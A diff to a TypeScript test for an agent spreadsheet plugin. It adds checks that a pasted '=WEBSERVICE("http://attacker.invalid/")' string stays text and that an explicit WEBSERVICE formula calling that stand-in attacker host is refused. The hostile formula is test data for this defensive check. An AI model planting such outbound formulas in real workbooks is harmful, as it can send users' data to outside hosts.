@@ -100,19 +100,19 @@ test("agents create, inspect, and page through Excel workbooks without leaving t
     const written = json(await plugin.tool.spreadsheet_write.execute({
       path: "reports/pipeline.xlsx",
       sheets: [
-        { name: "Summary", rows: [["Account", "Amount", "Won"], ["Northstar", 1742.42, true], ["Total", "=SUM(B2:B2)", null]] },
+        { name: "Summary", rows: [["Account", "Amount", "Won"], ["Northstar", 1742.42, true], ["Total", { formula: "SUM(B2:B2)" }, null], ["Pasted", '=WEBSERVICE("http://attacker.invalid/")', null]] },
         { name: "Detail", header: false, rows: Array.from({ length: 120 }, (_row, index) => [index + 1, `row ${index + 1}`]) },
       ],
     }));
     expect(written).toMatchObject({ ok: true, path: "reports/pipeline.xlsx", replaced: false });
-    expect(written.sheets).toEqual([{ name: "Summary", rows: 3, columns: 3 }, { name: "Detail", rows: 120, columns: 2 }]);
+    expect(written.sheets).toEqual([{ name: "Summary", rows: 4, columns: 3 }, { name: "Detail", rows: 120, columns: 2 }]);
     const bytes = await readFile(join(root, "reports", "pipeline.xlsx"));
     expect(bytes.subarray(0, 2).toString("latin1")).toBe("PK");
 
     const inspected = json(await plugin.tool.spreadsheet_inspect.execute({ path: "reports/pipeline.xlsx" }));
     expect(inspected).toMatchObject({ ok: true, sha256: expect.stringMatching(/^[0-9a-f]{64}$/), dateSystem: "1900" });
     expect(inspected.sheets).toEqual([
-      expect.objectContaining({ position: 1, name: "Summary", usedRange: "A1:C3", rows: 3, columns: 3, formulas: 1, header: ["Account", "Amount", "Won"] }),
+      expect.objectContaining({ position: 1, name: "Summary", usedRange: "A1:C4", rows: 4, columns: 3, formulas: 1, header: ["Account", "Amount", "Won"] }),
       expect.objectContaining({ position: 2, name: "Detail", usedRange: "A1:B120", rows: 120, columns: 2, formulas: 0 }),
     ]);
 
@@ -120,6 +120,13 @@ test("agents create, inspect, and page through Excel workbooks without leaving t
     expect(summary).toContain("| # | A | B | C |");
     expect(summary).toContain("| 2 | Northstar | 1742.42 | TRUE |");
     expect(summary).toContain("| 3 | Total | =SUM(B2:B2) |  |");
+    // Negative half: a pasted string that looks like a formula stays text, and
+    // an explicit formula that reaches outside the workbook is refused.
+    expect(summary).toContain('| 4 | Pasted | =WEBSERVICE("http://attacker.invalid/") |  |');
+    expect(summary).toContain("formulas: B3: =SUM(B2:B2)");
+    expect(summary).not.toContain("B4:");
+    await expect(plugin.tool.spreadsheet_write.execute({ path: "reports/unsafe.xlsx", sheets: [{ rows: [[{ formula: 'WEBSERVICE("http://attacker.invalid/")' }]] }] })).rejects.toThrow("only calculations inside the workbook are written");
+    await expect(stat(join(root, "reports", "unsafe.xlsx"))).rejects.toThrow();
     expect(summary).not.toContain("next:");
 
     const firstPage = await plugin.tool.spreadsheet_read.execute({ path: "reports/pipeline.xlsx", sheet: "Detail", maxRows: 100 });
@@ -145,7 +152,7 @@ test("agents create, inspect, and page through Excel workbooks without leaving t
 
     evidence.recordAssertionEvidence(
       "Agents can create, inspect, and page through Excel workbooks",
-      "spreadsheet_write produced a two-sheet .xlsx whose typed values, formula, header row, and 120-row sheet were read back through spreadsheet_inspect and paged spreadsheet_read; reads and writes outside the workspace were refused, and an existing workbook was not replaced without overwrite.",
+      "spreadsheet_write produced a two-sheet .xlsx whose typed values, explicit formula, header row, and 120-row sheet were read back through spreadsheet_inspect and paged spreadsheet_read; a pasted string starting with = stayed text, a WEBSERVICE formula was refused without creating a file, reads and writes outside the workspace were refused, and an existing workbook was not replaced without overwrite.",
       true,
     );
   });
